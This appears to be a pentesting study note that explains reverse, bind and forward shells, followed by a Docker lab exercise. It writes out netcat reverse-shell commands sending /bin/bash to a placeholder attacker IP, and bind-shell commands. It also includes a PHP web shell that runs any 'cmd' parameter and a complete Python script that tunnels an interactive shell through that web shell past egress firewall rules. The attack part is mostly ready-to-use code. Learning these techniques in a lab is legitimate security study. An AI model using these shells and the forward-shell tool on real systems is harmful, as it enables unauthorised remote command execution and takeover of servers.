# Reverse shell

It is a technique that allows an attacker to connect to a remote machine from a machine owned by the attacker. That is, a connection is established from the compromised machine to the attacker's machine. This is achieved by executing a malicious program or a specific instruction on the remote machine that establishes the connection back to the attacker's machine, allowing the attacker to take control of the remote machine.

For example, to perform a Reverse Shell with netcat we must execute the following command from the attacking machine:

```shell
nc -nlvp {PORT}
```

And this one from the victim machine:

```shell
nc -e /bin/bash {ATTACKER_IP} {ATTACKER_PORT}
```

Finally we can obtain an interactive shell (tty) in order to make the shell prettier:

```shell
script /dev/null -c bash
```

Other examples with other ways to obtain reverse shells can be found on [this page](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

# Bind shell

This technique is the opposite of Reverse Shell, since instead of the compromised machine connecting to the attacker's machine, it is the attacker who connects to the compromised machine. The attacker listens on a given port and the compromised machine accepts the incoming connection on that port. The attacker then has console access to the compromised machine, allowing him to take control of the compromised machine.

For example, to perform a Bind Shell with netcat we must execute the following command from the victim machine to offer a shell to the attacker:

```shell
nc -nlvp {PORT} -e /bin/bash
```

And this one from the attacker machine:

```shell
nc {VICTIM_IP} {VICTIM_PORT}
```

Finally we can obtain an interactive shell (tty) in order to make the shell prettier:

```shell
script /dev/null -c bash
```

# Forward shell

This technique is used when Reverse or Bind connections cannot be established due to Firewall rules implemented on the network. It is achieved by using mkfifo, which creates a FIFO (named pipe) file, which is used as a kind of interactive "simulated console" through which the attacker can operate on the remote machine. Instead of establishing a direct connection, the attacker redirects traffic through the FIFO file, allowing bidirectional communication with the remote machine.

----

# Example

In this example we will be running an apache2 service inside our [[Docker]] container, applying port-forwarding in our port 80:

```dockerfile
FROM ubuntu:latest

ENV DEBIAN_FRONTEND noninteractive

RUN apt update && apt install -y apache2 \
  php \
  nano \
  ncat \
  iptables \
  net-tools

EXPOSE 80

ENTRYPOINT service apache2 start && /bin/bash
```

Then we build the image and the container and we enter inside it:

```dockerfile
docker build -t my_image .
run -dit -p 80:80 --cap-add=NET_ADMIN --name myContainer my_image
docker exec -it myContainer bash
```

## Reverse shell

In our local machine (attacker) we will use netcat to listen incoming connections:

```shell
nc -nlvp {PORT}
```

In our docker container (victim) we will use netcat to connect to the attacker machine, offering a bash shell:

```shell
# CAUTION: The IP is the corresponding to 'docker0' interface in this case
nc -e /bin/bash {ATTACKER_IP} {ATTACKER_PORT}
```

Finally we can obtain an interactive shell (tty) in order to make the shell prettier:

```shell
script /dev/null -c bash
```

## Bind shell

First of all, in our docker container (victim) we will use netcat to listen incoming connections trough a specific port, offering a shell:

```shell
nc -nlvp {PORT} -e /bin/bash
```

Then, in our local machine (attacker) we will use netcat to establish the connection to victim machine:

```shell
nc {VICTIM_IP} {VICTIM_PORT}
```

Finally we can obtain an interactive shell (tty) in order to make the shell prettier:

```shell
script /dev/null -c bash
```

## Forward shell

First of all we need to establish two rules with *iptable* command for blocking the reverse shell attempt:

```shell
# Accepting output tcp in 80 port
iptables -A OUTPUT -p tcp -m tcp -o eth0 --sport 80 -j ACCEPT

# Blocking the other connections
iptables -A OUTPUT -o eth0 -j DROP
```

----
> We can clear all rules with the command *iptables -F*.
----

In this case we will suppose that we have managed to upload a "cmd.php" file to the victim machine that will be in charge of establishing a reverse shell to the attacker machine:

```php
<?
	echo shell_exec($_GET['cmd']);
?>
```

Let's try to execute the following command in the search bar of our browser inside the file that we have uploaded to the victim's apache server:

----
> Above command will not work if we don't edit the */etc/php/{PHP_VERSION}/apache2/php.ini* file and change the value of *short_open_tag* from Off to On. Then run *service apache2 restart*.
----

```url
http://localhost/cmd.php?cmd=nc -e /bin/bash {ATTACKER_IP} {ATTACKER_PORT}
```

We will realize that because of the rules we have defined before we cannot establish the connection. In this case we must use the command mkfifo to establish the communication through this script "tty_over_http.py":

```python
#!/usr/bin/python3

import requests, time, threading, pdb, signal, sys
from base64 import b64encode
from random import randrange

class AllTheReads(object):
	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True
		thread.start()

	def run(self):
		readoutput = """/bin/cat %s""" % (stdout)
		clearoutput = """echo '' > %s""" % (stdout)
		while True:
			output = RunCmd(readoutput)
			if output:
				RunCmd(clearoutput)
				print(output)
			time.sleep(self.interval)

def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
        	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
		}
	result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
	return result

def WriteCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
	}
	result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
	return result

def ReadCmd():
        GetOutput = """/bin/cat %s""" % (stdout)
        output = RunCmd(GetOutput)
        return output

def SetupShell():
	NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
	try:
		RunCmd(NamedPipes)
	except:
		None
	return None

global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
erasestdin = """/bin/rm %s""" % (stdin)
erasestdout = """/bin/rm %s""" % (stdout)

SetupShell()

ReadingTheThings = AllTheReads()

def sig_handler(sig, frame):
	print("\n\n[*] Exiting...\n")
	print("[*] Removing files...\n")
	RunCmd(erasestdin)
	RunCmd(erasestdout)
	print("[*] All files have been deleted\n")
	sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

while True:
	cmd = input("> ")
	WriteCmd(cmd + "\n")
	time.sleep(1.1)
```

And then, run it:
```shell
python3 tty_over_http.py
```